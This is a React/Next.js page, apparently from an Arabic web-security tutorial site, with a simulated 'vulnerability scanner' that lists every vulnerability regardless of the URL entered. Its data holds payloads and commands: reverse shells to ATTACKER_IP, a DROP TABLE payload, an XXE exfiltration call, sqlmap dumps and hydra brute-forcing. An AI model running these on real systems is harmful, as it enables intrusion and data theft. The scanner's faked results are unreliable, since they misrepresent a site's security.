'use client'

import { useState } from 'react'
import Link from 'next/link'

const vulnerabilities = [
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    titleAr: 'حقن SQL',
    icon: '💉',
    severity: 'critical',
    description: 'ثغرة تسمح بحقن أكواد SQL ضارة في استعلامات قاعدة البيانات',
    payloads: ["' OR '1'='1", "' OR '1'='1' --", "1 UNION SELECT NULL--", "1; DROP TABLE users--"],
    commands: [
      "sqlmap -u \"TARGET_URL?id=1\" --dbs",
      "sqlmap -u \"TARGET_URL?id=1\" -D database --tables",
      "sqlmap -u \"TARGET_URL?id=1\" -D database -T users --dump"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح SQL Injection بالعربي'
  },
  {
    id: 'xss',
    title: 'XSS',
    titleAr: 'حقن النصوص',
    icon: '📜',
    severity: 'high',
    description: 'ثغرة تسمح بحقن سكريبتات ضارة في صفحات الويب',
    payloads: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", "javascript:alert('XSS')"],
    commands: [
      "XSStrike -u \"TARGET_URL\"",
      "dalfox url \"TARGET_URL?q=test\"",
      "cat urls.txt | dalfox pipe"
    ],
    videoId: 'q0bzXY32xiI',
    videoTitle: 'شرح XSS كامل'
  },
  {
    id: 'csrf',
    title: 'CSRF',
    titleAr: 'تزوير الطلبات',
    icon: '🎣',
    severity: 'high',
    description: 'ثغرة تسمح بتنفيذ عمليات غير مرغوبة عبر طلبات مزيفة',
    payloads: ['<img src="http://TARGET/action?transfer=1000">', '<form action="http://TARGET/change-email" method="POST"><input name="email" value="evil@hack.com"></form>'],
    commands: [
      "Burp Suite -> Repeater -> Modify request",
      "csrf-tester -u \"TARGET_URL\"",
      " manually craft HTML form"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح CSRF بالعربي'
  },
  {
    id: 'ssrf',
    title: 'SSRF',
    titleAr: 'تزوير الطلبات من الخادم',
    icon: '🖥️',
    severity: 'high',
    description: 'ثغرة تسمح بتجهيز طلبات من الخادم إلى موارد داخلية',
    payloads: ["http://127.0.0.1:8080", "http://localhost:22", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"],
    commands: [
      "curl -v \"TARGET_URL?url=http://127.0.0.1\"",
      "Burp Collaborator",
      "SSRFmap -u \"TARGET_URL\" -p url -m portscan"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح SSRF'
  },
  {
    id: 'command-injection',
    title: 'Command Injection',
    titleAr: 'حقن الأوامر',
    icon: '⌨️',
    severity: 'critical',
    description: 'ثغرة تسمح بتنفيذ أوامر نظام التشغيل على الخادم',
    payloads: ["; ls -la", "| cat /etc/passwd", "`whoami`", "$(id)"],
    commands: [
      "; nc -e /bin/sh ATTACKER_IP 4444",
      "| bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
      "Use Burp to inject in parameters"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح Command Injection'
  },
  {
    id: 'lfi',
    title: 'LFI',
    titleAr: 'تضمين الملفات المحلية',
    icon: '📁',
    severity: 'high',
    description: 'ثغرة تسمح بقراءة ملفات محلية من الخادم',
    payloads: ["../../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php"],
    commands: [
      "curl \"TARGET_URL?page=../../../../etc/passwd\"",
      "python lfi_scanner.py -u TARGET_URL",
      "Burp -> Intruder with LFI wordlist"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح LFI'
  },
  {
    id: 'idor',
    title: 'IDOR',
    titleAr: 'التحكم بالمعرف',
    icon: '🔗',
    severity: 'high',
    description: 'ثغرة تسمح بالوصول لبيانات مستخدمين آخرين بتغيير المعرّف',
    payloads: ["/api/user/1 -> /api/user/2", "/profile?id=100 -> /profile?id=101", "/invoice/123 -> /invoice/124"],
    commands: [
      "Burp -> Repeater -> Change ID in URL",
      "For i in $(seq 1 1000); do curl \"TARGET/api/user/$i\"; done",
      "Autorize plugin for Burp Suite"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح IDOR'
  },
  {
    id: 'ssti',
    title: 'SSTI',
    titleAr: 'حقن القوالب',
    icon: '🎨',
    severity: 'critical',
    description: 'ثغرة تسمح بتنفيذ أكواد عبر محركات القوالب',
    payloads: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config.items()}}"],
    commands: [
      "tplmap -u \"TARGET_URL?name=test\"",
      "Manual: test {{7*7}} -> if 49 then vulnerable",
      "Use Tplmap for exploitation"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح SSTI'
  },
  {
    id: 'xxe',
    title: 'XXE',
    titleAr: 'حقن XML',
    icon: '📦',
    severity: 'high',
    description: 'ثغرة تسمح بقراءة ملفات عبر تضمين كيانات XML خارجية',
    payloads: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<foo>&xxe;</foo>', '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/steal?data=xxe">]>'],
    commands: [
      "Use Burp -> Repeater with XXE payload",
      "XXEinjector.rb -u TARGET_URL -x payload.xml",
      "Test with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح XXE'
  },
  {
    id: 'open-redirect',
    title: 'Open Redirect',
    titleAr: 'إعادة التوجيه المفتوحة',
    icon: '↗️',
    severity: 'medium',
    description: 'ثغرة تسمح بإعادة توجيه المستخدمين لمواقع ضارة',
    payloads: ["/redirect?url=https://evil.com", "/login?next=https://evil.com", "/auth?return_to=https://evil.com"],
    commands: [
      "curl -v \"TARGET_URL/redirect?url=https://evil.com\"",
      "Test all redirect parameters",
      "Use Burp to find redirect parameters"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح Open Redirect'
  },
  {
    id: 'jwt',
    title: 'JWT Attacks',
    titleAr: 'هجمات JWT',
    icon: '🔐',
    severity: 'high',
    description: 'ثغرات في توقيعات JWT تسمح بتزوير الهوية',
    payloads: ['{"alg":"none"}', 'Change alg HS256 to RS256', 'Weak secret: try common passwords'],
    commands: [
      "jwt_tool TARGET_TOKEN -T",
      "hashcat -m 16500 jwt.txt wordlist.txt",
      "john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح JWT Security'
  },
  {
    id: 'cors',
    title: 'CORS Misconfiguration',
    titleAr: 'خطأ في إعدادات CORS',
    icon: '🌐',
    severity: 'medium',
    description: 'خطأ في تكوين سياسات مشاركة الموارد عبر النطاقات',
    payloads: ['Origin: https://evil.com', 'Origin: null', 'Origin: https://TARGET.com.evil.com'],
    commands: [
      "curl -H \"Origin: https://evil.com\" -v TARGET_URL",
      "Use Burp -> Repeater with different Origin headers",
      "Check Access-Control-Allow-Origin header"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح CORS'
  },
  {
    id: 'subdomain-takeover',
    title: 'Subdomain Takeover',
    titleAr: 'استحواذ النطاق الفرعي',
    icon: '🌍',
    severity: 'high',
    description: 'استحواذ على نطاق فرعي غير مستخدم يشير لخدمة خارجية',
    payloads: ['Check CNAME record points to expired service', 'Register claimed service', 'Create content on taken service'],
    commands: [
      "subjack -w subdomains.txt -t 100 -timeout 30",
      "subover -w subdomains.txt",
      "Can I Take Over XYZ? - github.com/EdOverflow/can-i-take-over-xyz"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح Subdomain Takeover'
  },
  {
    id: 'file-upload',
    title: 'File Upload',
    titleAr: 'ثغرات رفع الملفات',
    icon: '📤',
    severity: 'high',
    description: 'ثغرة تسمح برفع ملفات ضارة مثل Webshells',
    payloads: ['shell.php.jpg', 'shell.php%00.jpg', 'shell.phtml', 'shell.php5'],
    commands: [
      "Upload webshell and access via browser",
      "Use Burp to modify upload request",
      "Try bypassing filters with double extension"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح File Upload'
  },
  {
    id: 'password-attacks',
    title: 'Password Attacks',
    titleAr: 'هجمات كلمات المرور',
    icon: '🔒',
    severity: 'high',
    description: 'هجمات تخمين وتكسير كلمات المرور',
    payloads: ['Common passwords list', 'Default credentials', 'Password spraying'],
    commands: [
      "hydra -l admin -P wordlist.txt TARGET http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"",
      "medusa -h TARGET -u admin -P wordlist.txt -M http",
      "crackmapexec smb TARGET -u users.txt -p passwords.txt"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح Password Attacks'
  },
  {
    id: 'ssrf',
    title: 'SSRF',
    titleAr: 'تزوير الطلبات من الخادم',
    icon: '🖥️',
    severity: 'high',
    description: 'ثغرة تسمح بتنفيذ طلبات HTTP من الخادم',
    payloads: ["http://127.0.0.1", "http://localhost", "file:///etc/passwd", "http://[::1]"],
    commands: [
      "curl \"TARGET_URL?url=http://127.0.0.1\"",
      "Use Burp Collaborator",
      "SSRFmap -u TARGET -p param"
    ],
    videoId: 'ISV8U8fheXw',
    videoTitle: 'شرح SSRF'
  }
]

export default function ScannerPage() {
  const [url, setUrl] = useState('')
  const [scanning, setScanning] = useState(false)
  const [results, setResults] = useState<typeof vulnerabilities>([])
  const [selectedVuln, setSelectedVuln] = useState<string | null>(null)

  const handleScan = () => {
    if (!url) return
    setScanning(true)
    setSelectedVuln(null)
    
    // Simulate scanning
    setTimeout(() => {
      setResults(vulnerabilities)
      setScanning(false)
    }, 2000)
  }

  return (
    <div className="min-h-screen" style={{ background: '#0d1117' }}>
      {/* Header */}
      <div style={{ background: '#161b22', borderBottom: '1px solid #30363d' }} className="p-6">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-2 mb-2" style={{ color: '#7d8590', fontSize: '12px' }}>
            <Link href="/" className="hover:text-[#e6edf3]">الرئيسية</Link>
            <span>›</span>
            <span style={{ color: '#e6edf3' }}>أداة الفحص</span>
          </div>
          <h1 className="text-3xl font-bold flex items-center gap-3" style={{ color: '#e6edf3' }}>
            <span className="text-4xl">🔍</span>
            أداة فحص الثغرات
          </h1>
          <p style={{ color: '#7d8590', fontSize: '14px' }} className="mt-2">
            أدخل رابط الموقع لعرض جميع الثغرات المحتملة مع طرق التشغيل والفيديوهات
          </p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto p-6">
        {/* URL Input */}
        <div className="gradient-border p-6 mb-8">
          <div className="code-devtools">
            <div className="code-devtools-header">
              <div className="flex items-center gap-2">
                <div className="code-devtools-dot" style={{ background: '#f85149' }}></div>
                <div className="code-devtools-dot" style={{ background: '#d29922' }}></div>
                <div className="code-devtools-dot" style={{ background: '#3fb950' }}></div>
              </div>
              <span style={{ color: '#7d8590', fontSize: '11px' }}>Vulnerability Scanner</span>
            </div>
            <div className="code-devtools-body">
              <div className="flex items-center gap-3">
                <span style={{ color: '#7d8590' }}>{'>'}</span>
                <input
                  type="text"
                  value={url}
                  onChange={(e) => setUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="flex-1 bg-transparent border-none outline-none"
                  style={{ color: '#e6edf3', fontSize: '14px', fontFamily: 'inherit' }}
                  dir="ltr"
                  onKeyPress={(e) => e.key === 'Enter' && handleScan()}
                />
                <button
                  onClick={handleScan}
                  className="btn-premium"
                  disabled={scanning}
                >
                  {scanning ? 'جاري الفحص...' : '🔍 فحص'}
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Scanning Animation */}
        {scanning && (
          <div className="text-center py-12">
            <div className="inline-flex items-center gap-3">
              <div className="w-4 h-4 rounded-full animate-pulse" style={{ background: '#58a6ff' }}></div>
              <div className="w-4 h-4 rounded-full animate-pulse" style={{ background: '#bc8cff', animationDelay: '0.2s' }}></div>
              <div className="w-4 h-4 rounded-full animate-pulse" style={{ background: '#f778ba', animationDelay: '0.4s' }}></div>
            </div>
            <p style={{ color: '#7d8590', marginTop: '12px' }}>جاري تحليل الموقع...</p>
          </div>
        )}

        {/* Results */}
        {results.length > 0 && !scanning && (
          <div className="space-y-4">
            {/* Summary */}
            <div className="gradient-border p-4 mb-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <span className="text-2xl">📊</span>
                  <div>
                    <h3 style={{ color: '#e6edf3', fontSize: '16px', fontWeight: 'bold' }}>نتائج الفحص</h3>
                    <p style={{ color: '#7d8590', fontSize: '12px' }}>{url}</p>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <span className="severity-critical">{results.filter(r => r.severity === 'critical').length} حرجة</span>
                  <span className="severity-high">{results.filter(r => r.severity === 'high').length} عالية</span>
                  <span className="severity-medium">{results.filter(r => r.severity === 'medium').length} متوسطة</span>
                </div>
              </div>
            </div>

            {/* Vulnerability List */}
            <div className="space-y-3">
              {results.map((vuln) => (
                <div key={vuln.id} className="gradient-border overflow-hidden">
                  {/* Vuln Header */}
                  <div 
                    className="p-4 cursor-pointer transition-all hover:bg-[rgba(88,166,255,0.05)]"
                    onClick={() => setSelectedVuln(selectedVuln === vuln.id ? null : vuln.id)}
                    style={{ background: '#161b22' }}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <span className="text-2xl">{vuln.icon}</span>
                        <div>
                          <h4 style={{ color: '#e6edf3', fontSize: '14px', fontWeight: 'bold' }}>{vuln.titleAr}</h4>
                          <p style={{ color: '#7d8590', fontSize: '12px' }}>{vuln.title}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        <span className={`severity-${vuln.severity}`}>{vuln.severity.toUpperCase()}</span>
                        <span style={{ color: '#7d8590', fontSize: '12px' }}>{selectedVuln === vuln.id ? '▼' : '▶'}</span>
                      </div>
                    </div>
                  </div>

                  {/* Expanded Content */}
                  {selectedVuln === vuln.id && (
                    <div className="p-4" style={{ background: '#0d1117', borderTop: '1px solid #30363d' }}>
                      {/* Description */}
                      <div className="mb-4">
                        <h5 style={{ color: '#58a6ff', fontSize: '12px', fontWeight: 'bold', marginBottom: '8px' }}>📝 الوصف</h5>
                        <p style={{ color: '#e6edf3', fontSize: '13px', lineHeight: '1.8' }}>{vuln.description}</p>
                      </div>

                      {/* Payloads */}
                      <div className="mb-4">
                        <h5 style={{ color: '#f85149', fontSize: '12px', fontWeight: 'bold', marginBottom: '8px' }}>💉 Payloads للاختبار</h5>
                        <div className="code-devtools">
                          <div className="code-devtools-body">
                            {vuln.payloads.map((payload, i) => (
                              <div key={i} className="flex items-center gap-2 mb-1">
                                <span style={{ color: '#7d8590' }}>{'>'}</span>
                                <code style={{ color: '#a5d6ff', fontSize: '12px' }}>{payload}</code>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>

                      {/* Commands */}
                      <div className="mb-4">
                        <h5 style={{ color: '#3fb950', fontSize: '12px', fontWeight: 'bold', marginBottom: '8px' }}>⚡ الأوامر</h5>
                        <div className="code-devtools">
                          <div className="code-devtools-body">
                            {vuln.commands.map((cmd, i) => (
                              <div key={i} className="flex items-center gap-2 mb-1">
                                <span style={{ color: '#7d8590' }}>$</span>
                                <code style={{ color: '#7ee787', fontSize: '12px', direction: 'ltr' }}>{cmd}</code>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>

                      {/* YouTube Video */}
                      <div>
                        <h5 style={{ color: '#f85149', fontSize: '12px', fontWeight: 'bold', marginBottom: '8px' }}>🎬 فيديو يوتيوب</h5>
                        <div className="rounded-lg overflow-hidden" style={{ border: '1px solid #30363d' }}>
                          <div className="relative" style={{ paddingBottom: '56.25%', height: 0 }}>
                            <iframe
                              src={`https://www.youtube.com/embed/${vuln.videoId}`}
                              title={vuln.videoTitle}
                              className="absolute inset-0 w-full h-full"
                              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                              allowFullScreen
                            ></iframe>
                          </div>
                        </div>
                        <p style={{ color: '#7d8590', fontSize: '11px', marginTop: '8px' }}>{vuln.videoTitle}</p>
                      </div>

                      {/* Link to full page */}
                      <div className="mt-4 pt-4" style={{ borderTop: '1px solid #30363d' }}>
                        <Link 
                          href={`/vulnerabilities/${vuln.id}`}
                          className="btn-ghost inline-block"
                        >
                          عرض التفاصيل الكاملة ←
                        </Link>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Empty State */}
        {results.length === 0 && !scanning && (
          <div className="text-center py-16">
            <span className="text-6xl mb-4 block">🔍</span>
            <h3 style={{ color: '#e6edf3', fontSize: '18px', fontWeight: 'bold', marginBottom: '8px' }}>أدخل رابط الموقع</h3>
            <p style={{ color: '#7d8590', fontSize: '14px', maxWidth: '400px', margin: '0 auto' }}>
              أدخل رابط الموقع الذي تريد فحصه وسنعرض لك جميع الثغرات المحتملة مع طرق التشغيل والفيديوهات التعليمية
            </p>
          </div>
        )}
      </div>
    </div>
  )
}
